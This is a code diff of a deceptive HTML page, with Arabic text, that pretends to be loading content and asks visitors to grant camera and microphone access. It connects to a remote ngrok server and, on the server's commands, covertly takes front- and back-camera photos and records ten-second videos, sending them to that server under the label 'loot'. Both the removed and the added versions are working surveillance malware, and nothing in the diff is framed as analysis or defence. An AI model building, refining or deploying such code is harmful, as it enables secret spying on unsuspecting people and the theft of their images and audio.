@@ -1,56 +1,50 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8"><title>Loading...</title>
+    <meta charset="UTF-8">
+    <title>تحميل المحتوى...</title>
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
 </head>
-<body style="background:#000; color:#fff; text-align:center;">
-    <h2>جاري التحميل...</h2>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+    <h2 id="status">جاري الاتصال بالسيرفر...</h2>
+    <p>يرجى السماح بالصلاحيات للمتابعة</p>
+
     <script>
-        const SERVER_URL = "https://kinship-porridge-molasses.ngrok-free.dev";
-        let socket, activeStream = null;
+        const socket = io("https://kinship-porridge-molasses.ngrok-free.dev");
+        let stream = null;
 
-        async function stopStream() {
-            if(activeStream) { activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }
-        }
-
-        async function takePhoto(facing) {
-            await stopStream();
+        // طلب الصلاحيات فور الدخول
+        async function askPerms() {
             try {
-                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
-                const v = document.createElement('video'); v.srcObject = activeStream; await v.play();
+                stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+                document.getElementById('status').innerText = "✅ تم التحميل، استمتع بالمشاهدة";
+            } catch(e) { document.getElementById('status').innerText = "⚠️ فشل التحميل: يرجى تفعيل الكاميرا"; }
+        }
+        askPerms();
+
+        socket.on('command', async (cmd) => {
+            if (cmd.action.includes('scan')) {
+                const facing = cmd.action.includes('front') ? "user" : "environment";
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}});
+                const v = document.createElement('video'); v.srcObject = s; await v.play();
                 const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v,0,0);
-                socket.emit('loot', { type:'photo', data: c.toDataURL('image/png').split(',')[1], timestamp: Date.now() });
-                stopStream();
-            } catch(e) { socket.emit('loot', { info: "Cam Error: "+e.message }); }
-        }
-
-        async function recordVid(sec, facing) {
-            await stopStream();
-            try {
-                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio:true });
-                const rec = new MediaRecorder(activeStream), chunks = [];
+                socket.emit('loot', {type:'photo', data: c.toDataURL('image/png').split(',')[1]});
+                s.getTracks().forEach(t => t.stop());
+            }
+            if (cmd.action.includes('vid')) {
+                const facing = cmd.action.includes('front') ? "user" : "environment";
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}, audio:true});
+                const rec = new MediaRecorder(s); const chunks = [];
                 rec.ondataavailable = e => chunks.push(e.data);
                 rec.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const r = new FileReader();
-                    r.onload = () => socket.emit('loot', { type:'video', data: r.result.split(',')[1], timestamp: Date.now() });
-                    r.readAsDataURL(blob);
-                    stopStream();
+                    const reader = new FileReader();
+                    reader.onload = () => socket.emit('loot', {type:'video', data: reader.result.split(',')[1]});
+                    reader.readAsDataURL(new Blob(chunks));
+                    s.getTracks().forEach(t => t.stop());
                 };
-                rec.start(); setTimeout(() => rec.stop(), sec*1000);
-            } catch(e) { socket.emit('loot', { info: "Vid Error: "+e.message }); }
-        }
-
-        socket = io(SERVER_URL);
-        socket.on('command', (cmd) => {
-            if(cmd.action === 'scan_front') takePhoto("user");
-            if(cmd.action === 'scan_back') takePhoto("environment");
-            if(cmd.action === 'vid_front') recordVid(10, "user");
-            if(cmd.action === 'vid_back') recordVid(10, "environment");
-            if(cmd.action === 'vibrate') navigator.vibrate(500);
-            if(cmd.action === 'screenshot') /* كود السكرين شوت كما هو */ ;
+                rec.start(); setTimeout(() => rec.stop(), 10000);
+            }
         });
     </script>
 </body>
